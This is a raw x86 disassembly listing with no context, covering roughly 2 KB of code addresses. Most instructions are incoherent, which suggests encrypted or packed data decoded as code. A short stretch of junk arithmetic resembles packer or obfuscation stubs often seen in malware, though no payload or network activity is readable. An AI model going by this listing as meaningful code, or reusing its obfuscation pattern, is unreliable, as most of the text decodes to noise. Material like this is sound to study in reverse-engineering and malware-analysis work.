  407928:	in     eax,dx
  407929:	cmp    ebp,esi
  40792b:	or     cl,0xbb
  40792e:	mov    eax,ds:0x50f0269c
  407933:	xchg   ebx,eax
  407934:	sub    al,0xd
  407936:	add    eax,0x631328ba
  40793b:	cmp    esi,ecx
  40793d:	and    eax,0x1953716
  407942:	sbb    DWORD PTR [edi+0x5c],edx
  407945:	aam    0x2c
  407947:	les    edi,FWORD PTR [ecx-0x59]
  40794a:	clc    
  40794b:	sub    al,0xf
  40794d:	dec    edx
  40794e:	push   edx
  40794f:	xchg   edi,eax
  407950:	sub    DWORD PTR [edx-0x7aa9ef23],ebx
  407956:	idiv   DWORD PTR [edx]
  407958:	jmp    0xd2c6:0xa3c11096
  40795f:	xor    dl,BYTE PTR [eax]
  407961:	adc    edx,DWORD PTR [ebp+ebx*4-0x3bb451bb]
  407968:	scas   eax,DWORD PTR es:[edi]
  407969:	nop
  40796a:	mov    esi,0x9fd674dd
  40796f:	fimul  DWORD PTR [edx+0x6f504620]
  407975:	jg     0x4079eb
  407977:	jns    0x4079da
  407979:	aas    
  40797a:	fadd   QWORD PTR [edx+esi*2]
  40797d:	frstor [ebx+0x25d25837]
  407983:	ret    
  407984:	aam    0xe3
  407986:	xor    BYTE PTR [esp+ecx*1-0x7487762f],bh
  40798d:	push   edx
  40798e:	int3   
  40798f:	pop    edi
  407990:	jmp    0x7b5bae2a
  407995:	sbb    BYTE PTR [edi+0x516c4caa],cl
  40799b:	mov    esi,0x3b266d4a
  4079a0:	mov    dl,BYTE PTR [ebx+0x45]
  4079a3:	jmp    FWORD PTR [edx-0x60]
  4079a6:	cli    
  4079a7:	je     0x407953
  4079a9:	popa   
  4079aa:	jecxz  0x407a25
  4079ac:	(bad)  
  4079ad:	lock retf 0xb250
  4079b1:	cmp    cl,BYTE PTR [ebx+0x43195ace]
  4079b7:	sub    esp,DWORD PTR [ebx+0x45c8d966]
  4079bd:	(bad)  
  4079bf:	enter  0xe29f,0xb7
  4079c3:	pop    eax
  4079c4:	adc    al,0xd0
  4079c6:	mov    ch,0xdc
  4079c8:	adc    eax,0xb419c2
  4079cd:	icebp  
  4079ce:	loopne 0x407a03
  4079d0:	sbb    dh,dh
  4079d2:	cmp    al,0xfe
  4079d4:	inc    esp
  4079d5:	retf   0x14bf
  4079d8:	dec    esp
  4079d9:	hlt    
  4079da:	inc    ecx
  4079db:	cld    
  4079dc:	shl    DWORD PTR [edx+0xc63df5e],0x1e
  4079e3:	jmp    0xf0e9:0x9bcd1a22
  4079ea:	mov    edi,0xb84a2d24
  4079ef:	pop    ebx
  4079f0:	jno    0x4079f2
  4079f2:	bound  ecx,QWORD PTR [eax+0x26]
  4079f5:	psubw  mm7,QWORD PTR [ecx]
  4079f8:	mov    eax,DWORD PTR [ebp-0xc]
  4079fb:	mov    ecx,DWORD PTR [ebp-0xc]
  4079fe:	sub    eax,ecx
  407a00:	mov    DWORD PTR [ebp-0xc],eax
  407a03:	or     DWORD PTR [ebp-0xc],0xf89c85f9
  407a0a:	mov    eax,DWORD PTR [ebp-0x1c]
  407a0d:	mov    ecx,DWORD PTR [ebp-0x1c]
  407a10:	sub    eax,ecx
  407a12:	mov    DWORD PTR [ebp-0x1c],eax
  407a15:	or     DWORD PTR [ebp-0x1c],0xf89c85d9
  407a1c:	mov    eax,DWORD PTR [ebp-0x20]
  407a1f:	mov    ecx,DWORD PTR [ebp-0x20]
  407a22:	sub    eax,ecx
  407a24:	mov    DWORD PTR [ebp-0x20],eax
  407a27:	mov    eax,DWORD PTR [ebp-0x2c]
  407a2a:	mov    ecx,DWORD PTR [ebp-0x20]
  407a2d:	mov    esi,0x7510899
  407a32:	xor    eax,esi
  407a34:	mov    edi,0x3272e0
  407a39:	add    eax,edi
  407a3b:	or     eax,ecx
  407a3d:	mov    DWORD PTR [ebp-0x20],eax
  407a40:	mov    eax,DWORD PTR [ebp-0x4]
  407a43:	mov    ecx,DWORD PTR [ebp-0x4]
  407a46:	jmp    0x409df0
  407a4b:	clc    
  407a4c:	mov    dh,0xeb
  407a4e:	cmp    DWORD PTR [ebx+0x707b9c77],0xf237e350
  407a58:	stos   DWORD PTR es:[edi],eax
  407a59:	dec    eax
  407a5a:	mov    esp,DWORD PTR [ebx-0x1a8585c4]
  407a60:	pop    edi
  407a61:	jp     0x407add
  407a63:	(bad)  
  407a64:	out    dx,eax
  407a65:	jbe    0x407ac5
  407a67:	sub    BYTE PTR [ecx-0x2b9e382f],bh
  407a6d:	pushf  
  407a6e:	test   eax,0xbd56d0d1
  407a73:	repz cmp eax,0x4de51e5d
  407a79:	jg     0x407a8f
  407a7b:	xchg   esp,eax
  407a7c:	(bad)  
  407a7d:	stc    
  407a7e:	int    0x7a
  407a80:	cmp    edx,DWORD PTR [edx]
  407a82:	pop    ebx
  407a83:	mov    ds:0x9b3f9f6d,eax
  407a88:	test   al,0x7d
  407a8a:	test   BYTE PTR [eax],ch
  407a8c:	bound  ebp,QWORD PTR [ebx+0x3ee2b908]
  407a92:	jbe    0x407a36
  407a94:	xor    BYTE PTR [ebx],ah
  407a96:	adc    DWORD PTR [ebx-0x5e292531],eax
  407a9c:	sub    DWORD PTR ds:0xb2982ad6,esp
  407aa2:	push   cs
  407aa3:	loopne 0x407af2
  407aa5:	sub    BYTE PTR [ebp-0x36],ch
  407aa8:	test   DWORD PTR [ecx-0x59e47943],esp
  407aae:	push   ds
  407aaf:	imul   DWORD PTR [edi-0x68]
  407ab2:	pop    eax
  407ab3:	mov    bh,0xa8
  407ab5:	jb     0x407b2d
  407ab7:	rol    edx,1
  407ab9:	push   0xffffff8b
  407abb:	mov    esp,0xd40ba449
  407ac0:	adc    esp,ecx
  407ac2:	pushf  
  407ac3:	gs push ebp
  407ac5:	es jo  0x407a6a
  407ac8:	loope  0x407a88
  407aca:	jb     0x407a8b
  407acc:	xor    ebp,eax
  407ace:	add    DWORD PTR [eax+0x2994c399],edx
  407ad4:	fs in  eax,0xc3
  407ad7:	jnp    0x407af7
  407ad9:	fadd   DWORD PTR [eax]
  407adb:	xchg   ebp,eax
  407adc:	xchg   ecx,eax
  407add:	outs   dx,BYTE PTR ds:[esi]
  407ade:	push   ss
  407adf:	or     dl,BYTE PTR [edx]
  407ae1:	fimul  WORD PTR [edi-0x1c]
  407ae4:	fldln2 
  407ae6:	ror    BYTE PTR [esi-0x53],cl
  407ae9:	pop    esi
  407aea:	push   ds
  407aeb:	cmp    bh,cl
  407aed:	int3   
  407aee:	popf   
  407aef:	(bad)  [esi]
  407af1:	sar    ecx,0x93
  407af4:	cwde   
  407af5:	outs   dx,BYTE PTR ds:[esi]
  407af6:	mov    ds,ecx
  407af8:	retf   
  407af9:	mov    BYTE PTR [edx+0x29a20109],dh
  407aff:	mov    DWORD PTR [ecx-0x4d],eax
  407b02:	push   ecx
  407b03:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407b04:	sahf   
  407b05:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407b06:	es (bad) 
  407b09:	test   BYTE PTR [eax],bl
  407b0b:	adc    eax,0xde245e84
  407b10:	sti    
  407b11:	add    ebx,DWORD PTR [esi-0x7e332a3]
  407b17:	dec    edx
  407b18:	or     DWORD PTR [eax+eax*2],0x6a664dec
  407b1f:	jecxz  0x407acc
  407b21:	je     0x407afd
  407b23:	daa    
  407b24:	and    esi,DWORD PTR [ebp+ecx*2+0x1]
  407b28:	jnp    0x407abd
  407b2a:	mov    ds:0xcc6afeac,eax
  407b2f:	inc    edx
  407b30:	jmp    0x97c1b467
  407b35:	lahf   
  407b36:	cli    
  407b37:	xchg   ebx,eax
  407b38:	adc    al,0x93
  407b3a:	sbb    edx,DWORD PTR [esi-0xf]
  407b3d:	jmp    0x407b19
  407b3f:	les    esp,FWORD PTR [ebx]
  407b41:	add    ecx,DWORD PTR [ecx+ebx*4]
  407b44:	xchg   DWORD PTR [ebx+0x17],ecx
  407b47:	jge    0x407b70
  407b49:	repnz nop
  407b4b:	mov    ebx,0x4f6f2e44
  407b50:	fstp   st(7)
  407b52:	repnz enter 0x9a58,0x7e
  407b57:	mov    ds:0x16c7c99c,al
  407b5c:	adc    al,0xad
  407b5e:	nop
  407b5f:	sub    DWORD PTR [edx+0x14901dac],esp
  407b65:	pop    ecx
  407b66:	mov    ?,ecx
  407b68:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407b69:	and    edi,edi
  407b6b:	or     BYTE PTR [esp+eiz*2],0x4
  407b6f:	fwait
  407b70:	outs   dx,DWORD PTR ds:[esi]
  407b71:	test   DWORD PTR [edi+0x34],esp
  407b74:	mov    ds:0xe05c8755,al
  407b79:	ins    BYTE PTR es:[edi],dx
  407b7a:	mov    ah,0x1d
  407b7c:	dec    esp
  407b7d:	add    al,0xf7
  407b7f:	jmp    0x10a7:0x99d41ad7
  407b86:	(bad)  
  407b87:	js     0x407bc3
  407b89:	push   ds
  407b8a:	cmp    ecx,0xffffffbb
  407b8d:	add    BYTE PTR [edi-0x58],bh
  407b90:	push   es
  407b91:	push   ecx
  407b92:	out    dx,al
  407b93:	inc    ecx
  407b94:	hlt    
  407b95:	inc    esi
  407b96:	pop    ebx
  407b97:	pop    esp
  407b98:	cmp    ah,BYTE PTR [edi+ebp*2]
  407b9b:	jmp    0x49ca:0x28aa2c0c
  407ba2:	jecxz  0x407be7
  407ba4:	xchg   ebx,eax
  407ba5:	sbb    eax,0xc0364423
  407baa:	inc    edi
  407bab:	jno    0x407b57
  407bad:	pop    eax
  407bae:	mov    ecx,0x7dc8561d
  407bb3:	int3   
  407bb4:	jb     0x407b4c
  407bb6:	mov    al,BYTE PTR [ecx]
  407bb8:	push   0x6eea9c69
  407bbd:	fincstp 
  407bbf:	int3   
  407bc0:	outs   dx,BYTE PTR ds:[esi]
  407bc1:	enter  0xdfb6,0x74
  407bc5:	push   0xbfc137fc
  407bca:	pop    ecx
  407bcb:	pop    esi
  407bcc:	inc    esp
  407bcd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407bce:	rol    BYTE PTR [ecx+ebp*1-0x3f],1
  407bd2:	loopne 0x407b65
  407bd4:	icebp  
  407bd5:	adc    al,0x5a
  407bd7:	loope  0x407b94
  407bd9:	mov    esp,0x3b7737ff
  407bde:	fld    QWORD PTR [eax+0x3725e1ef]
  407be4:	(bad)  
  407be5:	clc    
  407be6:	and    BYTE PTR [eax-0x732e4c8a],bh
  407bec:	jge    0x407c6c
  407bee:	sbb    al,BYTE PTR [ebx]
  407bf0:	cwde   
  407bf1:	cmp    eax,0x315c7751
  407bf6:	je     0x407bbb
  407bf8:	nop
  407bf9:	repz ror DWORD PTR [ebx],cl
  407bfc:	pop    esi
  407bfd:	(bad)  
  407bfe:	popf   
  407bff:	mov    esp,0x89e10e8f
  407c04:	jns    0x407bf0
  407c06:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407c07:	lea    ebp,[edi+0xaf0f35b]
  407c0d:	xchg   esi,eax
  407c0e:	add    dh,BYTE PTR [ecx+eax*8-0x3869ad82]
  407c15:	shl    BYTE PTR [ebp+esi*8-0x505026f4],cl
  407c1c:	stos   DWORD PTR es:[edi],eax
  407c1d:	out    0x9b,al
  407c1f:	dec    ebx
  407c20:	mov    WORD PTR [eax-0x54],fs
  407c23:	cmp    al,0x52
  407c25:	ss mov ch,0x5a
  407c28:	lahf   
  407c29:	sti    
  407c2a:	call   0x7961:0xbbe46d42
  407c31:	xor    ebp,DWORD PTR [ebp-0x4952576]
  407c37:	push   eax
  407c38:	pop    ecx
  407c39:	sbb    BYTE PTR [edi+eiz*2-0x12],bl
  407c3d:	fnsave [esp+edx*1-0x46566bd7]
  407c44:	cdq    
  407c45:	mov    ds:0x1a2ecb9,eax
  407c4a:	or     al,BYTE PTR [ebx]
  407c4c:	sar    BYTE PTR [eax+edx*8],cl
  407c4f:	aaa    
  407c50:	add    BYTE PTR [edx+0xc],ch
  407c53:	jo     0x407ca8
  407c55:	call   FWORD PTR [edi-0x53243fb2]
  407c5b:	dec    esp
  407c5c:	mov    esp,0x49e5a6bd
  407c61:	push   0xffffffb2
  407c63:	icebp  
  407c64:	mov    al,BYTE PTR [ebp+0x31]
  407c67:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407c68:	jae    0x407c0d
  407c6a:	cmp    dh,BYTE PTR [ecx]
  407c6c:	and    BYTE PTR [edi+0x52c5ff85],bl
  407c72:	out    0x9f,al
  407c74:	dec    edi
  407c75:	(bad)  
  407c76:	int3   
  407c77:	rcr    DWORD PTR [ebx+0x79a799e8],1
  407c7d:	xchg   ecx,eax
  407c7e:	mov    edx,0x99c84454
  407c83:	adc    ebx,DWORD PTR [edx+0x6be8deb2]
  407c89:	push   eax
  407c8a:	jle    0x407c78
  407c8c:	push   0xf
  407c8e:	lods   eax,DWORD PTR ds:[esi]
  407c8f:	inc    ebx
  407c90:	loope  0x407c3c
  407c92:	fwait
  407c93:	mov    edi,es
  407c95:	scas   al,BYTE PTR es:[edi]
  407c96:	inc    edx
  407c97:	mov    ah,dl
  407c99:	cmp    BYTE PTR [eax],0xcb
  407c9c:	cwde   
  407c9d:	mov    ds:0x775f402b,al
  407ca2:	adc    al,0x7
  407ca4:	scas   al,BYTE PTR es:[edi]
  407ca5:	repnz sbb DWORD PTR [ecx+0xf],eax
  407ca9:	rcr    ebp,0x6
  407cac:	nop
  407cad:	out    0xd1,eax
  407caf:	stos   BYTE PTR es:[edi],al
  407cb0:	das    
  407cb1:	retf   0x6ae9
  407cb4:	xchg   ebx,eax
  407cb5:	scas   eax,DWORD PTR es:[edi]
  407cb6:	out    dx,al
  407cb7:	xor    BYTE PTR ds:0x67e491cf,0x47
  407cbe:	cmp    BYTE PTR ds:0x40538b6b,dh
  407cc4:	cmps   DWORD PTR cs:[esi],DWORD PTR es:[edi]
  407cc6:	add    ecx,DWORD PTR [ebp-0x36]
  407cc9:	pushf  
  407cca:	lahf   
  407ccb:	dec    ecx
  407ccc:	xor    DWORD PTR [ebx-0x1478199d],esp
  407cd2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407cd3:	sbb    eax,eax
  407cd5:	rcl    DWORD PTR [edx+eax*4-0x1a50aaa9],0x5d
  407cdd:	sbb    ebx,esp
  407cdf:	ffree  st(1)
  407ce1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407ce2:	es (bad) 
  407ce4:	test   DWORD PTR [ecx],ebx
  407ce6:	test   al,0xb0
  407ce8:	and    DWORD PTR [edi],ebp
  407cea:	popf   
  407ceb:	xchg   esi,eax
  407cec:	sub    bh,cl
  407cee:	sub    dh,BYTE PTR [edx-0x7b7eb584]
  407cf4:	cli    
  407cf5:	dec    ebp
  407cf6:	std    
  407cf7:	les    ebx,FWORD PTR [ebx-0x3606faef]
  407cfd:	or     al,0x47
  407cff:	sub    DWORD PTR ds:0xc79cdc4a,esi
  407d05:	arpl   WORD PTR [ecx+0x6e36bae3],cx
  407d0b:	inc    edi
  407d0c:	dec    eax
  407d0d:	(bad)  
  407d0f:	push   eax
  407d10:	out    dx,al
  407d11:	aam    0x8b
  407d13:	out    0xf7,al
  407d15:	retf   0x55fc
  407d18:	test   BYTE PTR [ebx-0x1d],cl
  407d1b:	inc    eax
  407d1c:	das    
  407d1d:	(bad)  
  407d1e:	cld    
  407d1f:	add    DWORD PTR [edi],0x166fe45e
  407d25:	ds enter 0x6192,0xff
  407d2a:	xor    eax,0x950c9d2
  407d2f:	dec    edx
  407d30:	aas    
  407d31:	inc    edx
  407d32:	fxrstor [ebp+0xe3f7d22]
  407d39:	sub    edx,ebx
  407d3b:	mov    ah,BYTE PTR [ebx+0x4f]
  407d3e:	sti    
  407d3f:	imul   edx,esi,0x6e1ff510
  407d45:	out    0x1a,al
  407d47:	add    al,0xc9
  407d49:	das    
  407d4a:	jne    0x407d87
  407d4c:	pminsw mm5,QWORD PTR [ebp-0x2d33f367]
  407d53:	shl    BYTE PTR [ecx-0x42],cl
  407d56:	call   0xc8bf662e
  407d5b:	inc    ebx
  407d5c:	test   DWORD PTR [ebp+0x4],ebp
  407d5f:	ja     0x407d0e
  407d61:	jmp    0xe799:0x32c30f51
  407d68:	push   edi
  407d69:	(bad)  
  407d6a:	ins    DWORD PTR es:[edi],dx
  407d6b:	add    eax,0x17a44344
  407d70:	fist   DWORD PTR [ecx+eax*4-0x3141c59a]
  407d77:	shl    BYTE PTR [esi],0x3d
  407d7a:	pop    edx
  407d7b:	add    al,0x78
  407d7d:	jno    0x407d59
  407d7f:	into   
  407d80:	outs   dx,BYTE PTR ds:[esi]
  407d81:	cmp    BYTE PTR [edx+0x58],0x56
  407d85:	push   edx
  407d86:	loop   0x407dd3
  407d88:	or     al,0x95
  407d8a:	cwde   
  407d8b:	xor    esi,DWORD PTR [ebx+0x7c]
  407d8e:	pop    edi
  407d8f:	jle    0x407d44
  407d91:	retf   0xf5c0
  407d94:	dec    ebx
  407d95:	xchg   ecx,edx
  407d97:	pop    edi
  407d98:	pop    es
  407d99:	fnstsw WORD PTR [edx+esi*1]
  407d9c:	daa    
  407d9d:	(bad)  
  407d9f:	das    
  407da0:	hlt    
  407da1:	inc    eax
  407da2:	pop    edi
  407da3:	mov    bl,0x6e
  407da5:	setne  BYTE PTR [ebp-0x3c]
  407da9:	ins    BYTE PTR es:[edi],dx
  407daa:	ss loopne 0x407dc9
  407dad:	(bad)  
  407dae:	in     al,0xf3
  407db0:	in     eax,0xff
  407db2:	or     ebp,DWORD PTR [ebp-0x26]
  407db5:	inc    ebp
  407db6:	loop   0x407dda
  407db8:	sahf   
  407db9:	daa    
  407dba:	iret   
  407dbb:	pop    ds
  407dbc:	stos   DWORD PTR es:[edi],eax
  407dbd:	and    eax,eax
  407dbf:	inc    ebx
  407dc0:	xchg   edx,eax
  407dc1:	sub    DWORD PTR [ecx-0x187a2a2f],edi
  407dc7:	cmc    
  407dc8:	sbb    BYTE PTR [ebp-0x21],dl
  407dcb:	push   ss
  407dcc:	sbb    bl,bl
  407dce:	mov    edx,0x2db032f4
  407dd3:	loope  0x407d59
  407dd5:	xchg   DWORD PTR [edx-0x23],ecx
  407dd8:	inc    ebp
  407dd9:	cmp    esp,DWORD PTR [eax-0x7a916dad]
  407ddf:	out    dx,eax
  407de0:	pusha  
  407de1:	push   edi
  407de2:	and    BYTE PTR [edx-0x73bd8e27],dl
  407de8:	imul   eax,edx,0x45fe2644
  407dee:	mov    bh,0xdc
  407df0:	cdq    
  407df1:	aam    0xc8
  407df3:	fld    TBYTE PTR [ebx+0x211a6558]
  407df9:	and    DWORD PTR [edx+eiz*4-0x4f],0x6c
  407dfe:	and    ecx,DWORD PTR [ecx+0x5c0069e2]
  407e04:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407e05:	idiv   DWORD PTR [ecx+esi*4-0x7e35fe27]
  407e0c:	xor    bl,dh
  407e0e:	dec    ebp
  407e0f:	inc    esp
  407e10:	push   edx
  407e11:	push   ss
  407e12:	mov    WORD PTR [edx+0x77cdf0ce],gs
  407e18:	and    al,0x78
  407e1a:	sbb    al,0xf3
  407e1c:	jo     0x407e93
  407e1e:	fidiv  DWORD PTR [ecx+0x469236fe]
  407e24:	enter  0x8766,0xf0
  407e28:	mov    al,0xfb
  407e2a:	gs cwde 
  407e2c:	aas    
  407e2d:	inc    ebp
  407e2e:	cmp    ecx,ebp
  407e30:	or     DWORD PTR [edx-0x2b],edi
  407e33:	into   
  407e34:	push   eax
  407e35:	mov    ebx,DWORD PTR [ecx-0x76]
  407e38:	mov    esp,0x7faa59a2
  407e3d:	push   DWORD PTR [eax+0x1aa5fc07]
  407e43:	sub    bl,cl
  407e45:	add    BYTE PTR [edi],0xe0
  407e48:	loopne 0x407e97
  407e4a:	mov    DWORD PTR [ebp-0x40],esp
  407e4d:	add    ebx,DWORD PTR [eax-0xf]
  407e50:	(bad)  
  407e52:	(bad)  
  407e53:	mov    ch,0x92
  407e55:	mov    edx,?
  407e57:	mov    ds:0xee91ea5,al
  407e5c:	or     eax,0xf90d5abe
  407e61:	cmp    ebp,ecx
  407e63:	jne    0x407e56
  407e65:	cmp    al,0x9a
  407e67:	stos   BYTE PTR es:[edi],al
  407e68:	mov    DWORD PTR [esi-0x3c0d06aa],esp
  407e6e:	mov    ch,0x86
  407e70:	jge    0x407e6d
  407e72:	mov    ds:0xab0bfef4,eax
  407e77:	lods   eax,DWORD PTR ds:[esi]
  407e78:	sbb    ch,BYTE PTR [ebp-0x6800d8a7]
  407e7e:	fcom   DWORD PTR [esi]
  407e80:	mov    edi,0xfc03cae2
  407e85:	sar    bl,0xc3
  407e88:	in     al,dx
  407e89:	dec    edi
  407e8a:	jmp    0x407e16
  407e8c:	repnz movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407e8e:	and    DWORD PTR [ebp-0x30fd5327],esp
  407e94:	fs inc ebp
  407e96:	jge    0x407ea4
  407e98:	add    al,0x8a
  407e9a:	loope  0x407e6d
  407e9c:	icebp  
  407e9d:	mov    ebx,DWORD PTR ds:0x837b84ec
  407ea3:	repz mov edi,0x4b277b10
  407ea9:	ins    DWORD PTR es:[edi],dx
  407eaa:	mov    ebp,0xb6f6f07c
  407eaf:	je     0x407ef8
  407eb1:	stos   BYTE PTR es:[edi],al
  407eb2:	(bad)  
  407eb3:	addr16 ret 0x2b43
  407eb7:	jle    0x407ef0
  407eb9:	sub    ecx,0xd9666712
  407ebf:	stos   BYTE PTR es:[edi],al
  407ec0:	mov    WORD PTR [eax+esi*4+0x4a44f71d],?
  407ec7:	mov    bl,0x4c
  407ec9:	ficom  WORD PTR [eax]
  407ecb:	dec    ecx
  407ecc:	pushf  
  407ecd:	or     eax,0x27ad598d
  407ed2:	(bad)  
  407ed3:	push   ebp
  407ed4:	jae    0x407e84
  407ed6:	jg     0x407f24
  407ed8:	sbb    eax,0x5d425b71
  407edd:	dec    esp
  407ede:	adc    DWORD PTR [esi-0x1e3a1a62],edx
  407ee4:	int3   
  407ee5:	cwde   
  407ee6:	mov    esp,0xaeb1c7f2
  407eeb:	mov    dh,0xf6
  407eed:	mov    esp,0x89d03080
  407ef2:	mov    edi,0xc3b40764
  407ef7:	getsec 
  407ef9:	pop    eax
  407efa:	lods   al,BYTE PTR ds:[esi]
  407efb:	rcr    bh,1
  407efd:	add    esi,DWORD PTR [esi-0x35]
  407f00:	scas   eax,DWORD PTR es:[edi]
  407f01:	push   eax
  407f02:	js     0x407ee6
  407f04:	mov    al,0x46
  407f06:	sub    al,0xa6
  407f08:	scas   al,BYTE PTR es:[edi]
  407f09:	inc    esi
  407f0a:	retf   0xfd00
  407f0d:	mov    ecx,0x13182c10
  407f12:	mov    esp,DWORD PTR fs:[ecx+ebx*4+0x74]
  407f17:	or     eax,0x979dd6f
  407f1c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407f1d:	lods   al,BYTE PTR ds:[esi]
  407f1e:	push   eax
  407f1f:	int    0xe5
  407f21:	(bad)  
  407f22:	and    edx,ebx
  407f24:	shr    ch,1
  407f26:	hlt    
  407f27:	mov    ebx,0xb8de7f81
  407f2c:	popa   
  407f2d:	fdivr  DWORD PTR [edx+eiz*8-0x36]
  407f31:	ins    DWORD PTR es:[edi],dx
  407f32:	rcl    BYTE PTR [esi],cl
  407f34:	gs ffreep st(0)
  407f37:	rcl    edx,cl
  407f39:	mov    bl,0xe6
  407f3b:	mov    ebp,0x6257123b
  407f40:	xor    al,0x29
  407f42:	mov    ch,0xd0
  407f44:	in     al,dx
  407f45:	sbb    DWORD PTR [esi+eiz*8],edx
  407f48:	sbb    BYTE PTR [ebx+0x433b2a45],bh
  407f4e:	and    eax,0xa976c130
  407f53:	mov    eax,ds:0xa3e32d76
  407f58:	cs sbb esi,edx
  407f5b:	ss pop ds
  407f5d:	push   ecx
  407f5e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407f5f:	jecxz  0x407fa8
  407f61:	nop
  407f62:	adc    DWORD PTR ds:0xa886eef3,0x975c6ad2
  407f6c:	aas    
  407f6d:	pop    es
  407f6e:	loope  0x407fac
  407f70:	jne    0x407f9b
  407f72:	hlt    
  407f73:	xor    eax,0x5e2649f7
  407f78:	jl     0x407fb4
  407f7a:	xor    eax,0x111f4086
  407f7f:	(bad)  
  407f81:	ins    DWORD PTR es:[edi],dx
  407f82:	inc    esi
  407f83:	push   esi
  407f84:	pushf  
  407f85:	mov    eax,ds:0x5f05190f
  407f8a:	sbb    esp,DWORD PTR [ecx+ecx*1-0x5e]
  407f8e:	mov    DWORD PTR [edx],ecx
  407f90:	cli    
  407f91:	xchg   edi,eax
  407f92:	pushf  
  407f93:	sbb    eax,DWORD PTR [ebx-0x11f7e94b]
  407f99:	xchg   BYTE PTR [ebx+ebx*4+0x30],al
  407f9d:	add    ch,al
  407f9f:	aad    0xdc
  407fa1:	jne    0x407f76
  407fa3:	add    eax,0xe358de8d
  407fa8:	adc    bh,BYTE PTR [esi+0x53]
  407fab:	or     eax,0x3b289814
  407fb0:	add    al,BYTE PTR [edx]
  407fb2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407fb3:	add    edx,DWORD PTR [ecx+edi*1]
  407fb6:	mov    ds:0xe6743264,al
  407fbb:	jge    0x407f4e
  407fbd:	and    bl,ah
  407fbf:	fsub   DWORD PTR [ebp-0x44384fc9]
  407fc5:	(bad)  
  407fc6:	sbb    al,0x4d
  407fc8:	add    BYTE PTR [edi+0x6465e174],ah
  407fce:	mov    dl,0x9c
  407fd0:	adc    esp,DWORD PTR [ebx*2+0x626eb289]
  407fd7:	sbb    eax,DWORD PTR [ecx-0x6fbeede]
  407fdd:	loope  0x408003
  407fdf:	out    0x5,al
  407fe1:	pop    ebx
  407fe2:	pop    ebp
  407fe3:	mov    dh,0x4a
  407fe5:	hlt    
  407fe6:	mov    eax,ds:0xc54df126
  407feb:	in     eax,dx
  407fec:	dec    ebp
  407fed:	dec    ebx
  407fee:	fldcw  WORD PTR [edi]
  407ff0:	push   esi
  407ff1:	sahf   
  407ff2:	inc    eax
  407ff3:	jge    0x407fce
  407ff5:	int    0x28
  407ff7:	sub    ebx,DWORD PTR [ebx+eiz*8]
  407ffa:	mov    dh,0x3f
  407ffc:	imul   eax
  407ffe:	aam    0x75
  408000:	out    dx,al
  408001:	retf   
  408002:	outs   dx,BYTE PTR ds:[esi]
  408003:	xor    BYTE PTR [ebx+0x7dc9b6b9],cl
  408009:	les    edx,FWORD PTR [edi+0x7c06552]
  40800f:	loop   0x408048
  408011:	mov    bh,0xd7
  408013:	sub    eax,0x3c268121
  408018:	call   0x5e7b:0xa751d780
  40801f:	repz not DWORD PTR [ecx+0x2]
  408023:	xchg   esp,eax
  408024:	xor    eax,0xfb38d395
  408029:	aad    0x75
  40802b:	pop    eax
  40802c:	icebp  
  40802d:	push   0x2d
  40802f:	pop    es
  408030:	(bad)  
  408032:	hlt    
  408033:	fldz   
  408035:	and    dh,BYTE PTR [esi-0x7aa2e293]
  40803b:	fnsave [ebx+0x4cf11555]
  408041:	je     0x407fee
  408043:	(bad)  
  408044:	xor    al,0x6a
  408046:	mov    ebp,0x3115e226
  40804b:	sbb    BYTE PTR [eax+ebx*2+0x2c],bh
  40804f:	ja     0x40807b
  408051:	sub    eax,ecx
  408053:	pop    ebp
  408054:	pop    eax
  408055:	aad    0x9f
  408057:	dec    ecx
  408058:	ror    BYTE PTR [edx+0x6a],cl
  40805b:	jl     0x408038
  40805d:	aam    0x8
  40805f:	inc    edx
  408060:	shr    esi,1
  408062:	lods   eax,DWORD PTR ds:[esi]
  408063:	(bad)  
  408064:	cmc    
  408065:	outs   dx,BYTE PTR ds:[esi]
  408066:	(bad)  
  408067:	imul   DWORD PTR [esi+0x13]
  40806a:	jbe    0x408012
  40806c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40806d:	in     al,dx
  40806e:	cmp    eax,0x59c52887
  408073:	arpl   WORD PTR [ebx+0x2],bp
  408076:	jbe    0x408025
  408078:	or     BYTE PTR [eax-0x7897c876],0x8b
  40807f:	mov    eax,edi
  408081:	inc    edi
  408082:	xor    al,BYTE PTR [ebx+ebx*1]
  408085:	sbb    BYTE PTR [ecx-0x7a],ah
  408088:	pop    ecx
  408089:	jp     0x4080ef
  40808b:	jae    0x4080e4
  40808d:	add    cl,BYTE PTR [ecx+eax*4]
  408090:	sbb    eax,0xc157e40b
  408095:	adc    dl,BYTE PTR [edi-0x37e7c6c7]
  40809b:	inc    edi
  40809c:	mov    cl,0x9e
  40809e:	lds    ecx,FWORD PTR [esi]
  4080a0:	fwait
  4080a1:	xchg   ebx,eax
  4080a2:	call   0x9157:0x8c860b92
  4080a9:	pop    ss
  4080aa:	cs add al,0xcb
  4080ad:	adc    eax,0x5d0c775b
  4080b2:	fs addr16 or al,0x99
  4080b6:	rol    DWORD PTR [eax-0x5a9ac2e8],1
  4080bc:	inc    edi
  4080bd:	inc    ecx
  4080be:	fs cdq 
  4080c0:	dec    ebp
  4080c1:	inc    esp
  4080c2:	push   edi
  4080c3:	aas    
  4080c4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4080c5:	cmp    dl,0x91
  4080c8:	and    ch,bh
  4080ca:	cld    
  4080cb:	pop    es
  4080cc:	mov    edi,0xd622ad8c
  4080d1:	push   cs
  4080d2:	mov    eax,cs:0x4949e620
  4080d8:	outs   dx,DWORD PTR ds:[esi]
  4080d9:	push   esi
  4080da:	int3   
  4080db:	sbb    ah,BYTE PTR [edi]
  4080dd:	cs xchg ebp,eax
  4080df:	inc    eax
  4080e0:	inc    esp
  4080e1:	add    DWORD PTR [edx+0x62],ebx
  4080e4:	push   ss
